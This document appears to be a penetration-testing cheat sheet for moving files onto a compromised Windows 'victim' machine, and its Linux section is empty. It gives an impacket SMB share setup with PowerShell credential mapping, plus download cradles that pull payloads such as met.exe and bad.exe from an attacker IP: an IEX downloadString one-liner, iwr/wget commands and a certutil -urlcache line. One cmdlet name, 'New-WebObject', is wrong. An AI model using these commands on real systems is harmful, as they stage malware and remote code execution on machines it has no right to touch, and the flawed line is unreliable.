# Windows

### impacket-smbserver. Useful when transferring through evilwinrm
On attacker machine. 
```
impacket-smbserver <NameOfServer> $(pwd) -smb2support -user <AnyUser-UsedForLater> -password <AnyPassword-UsedForLater>
```
On the victim Evilwinrm box
```
$pass = convertto-securestring <'AnyPassword'> -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential(<'AnyUser'>, $pass)

New-PSDrive -Name <UserFromLastStep> -PSProvider Filesystem -Credential $cred -Root \\<Attacker.IP.Address.>\<NameOfServer>
```

### Powershell
```
IEX(New-WebObject Net.WebClient).downloadString('http://<attacker.ip>:<port>/<file-to-download>')

iwr -uri http://attacker.IP/met.exe -Outfile met.exe

powershell wget -Uri http://attacker_IP/name.exe -OutFile C:\destination\directory\name.exe
```

### Certutil
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

# Linux
